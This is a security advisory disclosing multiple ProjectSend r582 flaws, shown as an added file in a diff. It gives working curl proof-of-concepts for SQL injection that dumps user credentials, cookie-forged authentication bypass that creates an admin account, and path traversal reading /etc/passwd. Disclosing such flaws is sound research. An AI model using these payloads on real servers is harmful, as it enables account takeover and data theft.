@@ -1,0 +1,133 @@
+Advisory ID:  SGMA-16001
+Title:  ProjectSend multiple vulnerabilities
+Product:  ProjectSend (previously cFTP)
+Version:  r582 and probably prior
+Vendor:  www.projectsend.org
+Vulnerability type:  SQL-injection, Auth bypass, Arbitrary File Access, Insecure Object Reference
+Risk level:  4 / 5
+Credit:  filippo.cavallarin@wearesegment.com
+CVE:  N/A
+Vendor notification:  2015-11-05
+Vendor fix:  N/A
+Public disclosure:  2016-01-29
+
+
+ProjectSend (previously cFTP) suffers from multiple vulnerabilities:
+
+
+- SQL Injection
+
+The script manage-files.php suffers from a SQL-Injection vulnerability because the request parameter "status" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
+The following proof-of-concept demostrates this issue by downloading login credentials of registered users:
+
+curl -X POST 'http://projectsend.local/manage-files.php?client_id=1' -H 'Cookie: PHPSESSID=hiefdo3ra5hgmpa5mrpdfhih22' --data "status=10' and 0 union select 0,1 ,'0) or 1 union select 0,1,concat(user,char(32),password),3,4,5,6,7,8,9 from tbl_users -- a',3,4,5,6,'7"
+
+
+
+- SQL Injection
+
+The script manage-files.php suffers from a SQL-Injection vulnerability because the request parameter "files" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
+The following proof-of-concept demostrates this issue by injecting a SLEEP command into the database engine:
+
+curl -X POST 'http://projectsend.local/manage-files.php' --data 'files_actions=delete&do_action=&files%5B%5D=5) OR 1=sleep(10' -H 'Cookie: PHPSESSID=hiefdo3ra5hgmpa5mrpdfhih22'
+
+
+
+- SQL Injection
+
+The script clients.php suffers from a SQL-Injection vulnerability because the request parameter "selected_clients" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
+There is no POC available, but the vulnerability is easy to spot by looking at the source code at line 63.
+
+    $selected_clients = $_POST['selected_clients'];
+    $clients_to_get = mysql_real_escape_string(implode(',',array_unique($selected_clients)));
+    $sql_user = $database->query("SELECT id, name FROM tbl_users WHERE id IN ($clients_to_get)");
+
+
+
+- SQL Injection
+
+The script clients.php suffers from a SQL-Injection vulnerability because the request parameter "status" is used to build a sql query without beeing properly sanitized. In order to exploit this issue, an attaccker must be logged into the application as a non-privileged user.
+There is no POC available, but the vulnerability is easy to spot by looking at the source code at line 146.
+
+    $status_filter = $_POST['status'];
+    $cq .= " AND active='$status_filter'";
+    [...]
+    $sql = $database->query($cq);
+
+
+
+- SQL Injection
+
+The script process-zip-download.php suffers from a SQL-Injection vulnerability because the request parameter "file" is used to build a sql query without beeing properly sanitized.
+There is no POC available, but the vulnerability is easy to spot by looking at the source code.
+
+    $files_to_zip = explode(',',substr($_GET['file'], 0, -1));
+    [...]
+    foreach ($files_to_zip as $file_to_zip) {
+    [...]
+    $sql_url = $database->query('SELECT id, expires, expiry_date FROM tbl_files WHERE url="' . $file_to_zip .'"');
+
+
+
+- SQL Injection
+
+The script home-log.php suffers from a SQL-Injection vulnerability because the request parameter "action" is used to build a sql query without beeing properly sanitized.
+There is no POC available, but the vulnerability is easy to spot by looking at the source code.
+
+    $log_action = $_GET['action'];
+    $log_query = "SELECT * FROM tbl_actions_log";
+    if (!empty($log_action)) {
+        $log_query .= " WHERE action = '$log_action'";
+
+
+
+- Authentication Bypass
+
+An Authenticaton Bypass vulnerability has been discovered in multiple pages. By adding a cookie to request it is possible to bypass certain authentication checks and gain access to protected resources.
+The following proof-of-concepts are available:
+
+Lists all registered users:
+curl http://projectsend.local/users.php -H 'Cookie: userlevel=9'
+
+Add an Admin user to the database:
+curl http://projectsend.local/users-add.php -H 'Cookie: userlevel=9' -X POST --data 'add_user_form_name=necci&add_user_form_email=poplix@papuasia.org&add_user_form_level=9&add_user_form_user=necci&add_user_form_active=1&add_user_form_pass=123456'
+
+Read file statsictics:
+curl http://projectsend.local/home.php -H 'Cookie: userlevel=9'
+
+Read file details:
+curl http://projectsend.local/edit-file.php?file_id=1 -H 'Cookie: userlevel=9'
+
+Bypass authentication:
+curl  'http://projectsend.local/process-zip-download.php' -H 'Cookie: userlevel=8'
+
+
+- Arbitrary File Download
+
+The page process-zip-download.php fails to restrict access to local files. By injecting a path traversal vector into the "file" parameter it is possible to read an arbitrary file from the server.
+By combining this vulnerability with the Authentication Bypass affecting the same file, is possible for a non-authenticated user to gain access to protected data.
+The followinf proof-of-concept is available.
+
+curl  'http://projectsend.local/process-zip-download.php?file=../../../../../../../../etc/passwdd' -H 'Cookie: userlevel=8' > ttt.zip
+
+
+- Insecure Direct Object References
+
+The page actions.log.export.php fails to perform authentication checks so it's possible for anyone to access logs data.
+The followinf proof-of-concept is available.
+
+curl http://projectsend.local/includes/actions.log.export.php
+
+
+Solution
+No solution is available at the time of writing.
+The vendor has been contacted about three months before the public disclosure, but he stopped responding after we sent him our report.
+
+
+References
+https://www.wearesegment.com/research/Projectsend_multiple_vulnerabilities
+http://www.projectsend.org
+
+
+Filippo Cavallarin
+https://wearesegment.com
